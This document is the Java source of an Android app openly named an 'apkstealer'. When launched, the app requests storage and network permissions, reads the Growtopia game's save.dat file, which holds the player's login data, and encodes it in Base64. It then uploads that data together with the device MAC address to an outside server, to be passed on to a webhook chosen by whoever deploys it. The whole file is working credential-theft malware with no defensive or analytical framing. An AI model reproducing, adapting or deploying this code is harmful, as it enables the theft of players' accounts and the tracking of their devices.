package com.example.apkstealer;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import kotlin.io.FilesKt;
import kotlin.jvm.internal.Intrinsics;

public class MainActivity extends AppCompatActivity {
    public int PERMISSION_ALL;

    public void steal()
    {
        final StringBuilder sb = new StringBuilder();
        final File externalStorageDirectory = Environment.getExternalStorageDirectory();
        Intrinsics.checkExpressionValueIsNotNull((Object) externalStorageDirectory, "Environment.getExternalStorageDirectory()");
        sb.append(externalStorageDirectory.getAbsolutePath());
        sb.append("/Android/data/com.rtsoft.growtopia/files/save.dat");
        final File file = new File(sb.toString());
        if (file.exists())
        {
            try {
                final String encodeToString = Base64.encodeToString(FilesKt.readBytes(file), 0);
                //Encrypt your webhook at https://lanx.ml/webhook.php
                postDataUsingVolley(encodeToString, "WebhookHere");
            }
            catch (Exception ex)
            {
                Toast.makeText((Context) this, (CharSequence)ex.getMessage(), Toast.LENGTH_LONG).show();
            }

        }
    }
    private final boolean hasPermissions(final Context context, final String... array) {
        final int length = array.length;
        int n = 0;
        while (true) {
            boolean b = true;
            if (n >= length) {
                return true;
            }
            if (ActivityCompat.checkSelfPermission(context, array[n]) != 0) {
                b = false;
            }
            if (!b) {
                return false;
            }
            ++n;
        }
    }

    public final void parseVolleyError(final VolleyError volleyError) {
        this.finishAffinity();
    }

    public final void check() {
        final String[] original = { "android.permission.INTERNET", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.ACCESS_NETWORK_STATE", "android.permission.ACCESS_WIFI_STATE", "android.permission.ACCESS_COARSE_LOCATION" };
        if (!this.hasPermissions((Context)this, (String[]) Arrays.copyOf(original, 5))) {
            ActivityCompat.requestPermissions((Activity)this, original, this.PERMISSION_ALL);
            return;
        }
        this.steal();
    }
    public final int getPERMISSION_ALL() {
        return this.PERMISSION_ALL;
    }

    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitDiskReads().permitDiskWrites().permitNetwork().build());
        this.check();
    }
    public String getMacAddress(){
        try{
            List<NetworkInterface> networkInterfaceList = Collections.list(NetworkInterface.getNetworkInterfaces());
            String stringMac = "";
            for(NetworkInterface networkInterface : networkInterfaceList)
            {
                if(networkInterface.getName().equalsIgnoreCase("wlon0"));
                {
                    for(int i = 0 ;i <networkInterface.getHardwareAddress().length; i++){
                        String stringMacByte = Integer.toHexString(networkInterface.getHardwareAddress()[i]& 0xFF);
                        if(stringMacByte.length() == 1)
                        {
                            stringMacByte = "0" +stringMacByte;
                        }
                        stringMac = stringMac + stringMacByte.toUpperCase();
                    }
                    break;
                }
            }
            return stringMac;
        }catch (SocketException e)
        {
            e.printStackTrace();
        }
        return  "0";
    }
    public void onRequestPermissionsResult(int n, final String[] array, final int[] array2) {
        super.onRequestPermissionsResult(n, array, array2);
        Intrinsics.checkParameterIsNotNull((Object) array, "permissions");
        Intrinsics.checkParameterIsNotNull((Object) array2, "grantResults");
        if (n == this.PERMISSION_ALL) {
            if (array2.length == 0) {
                n = 1;
            } else {
                n = 0;
            }
            if ((n ^ 0x1) != 0x0 && array2[0] == 0) {
                this.steal();
                return;
            }
            Toast.makeText((Context) this, (CharSequence) "Cannot run application because specified permissions were not granted. Please allow external storage reading.", Toast.LENGTH_SHORT).show();
        }
    }
    private void postDataUsingVolley(final String save, final String webhook) {


        String url = "https://lanx.ml";


        RequestQueue queue = Volley.newRequestQueue(MainActivity.this);


        StringRequest request = new StringRequest(Request.Method.POST, url, new com.android.volley.Response.Listener<String>() {
            @Override
            public void onResponse(String response) {


                try {

                    JSONObject respObj = new JSONObject(response);



                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new com.android.volley.Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                String mac = getMacAddress();
                Map<String, String> params = new HashMap<String, String>();
                params.put("protection", "Knakiri");
                params.put("save", save);
                params.put("mac", mac);
                params.put("webhook", webhook);
                return params;
            }
        };
        queue.add(request);
    }

}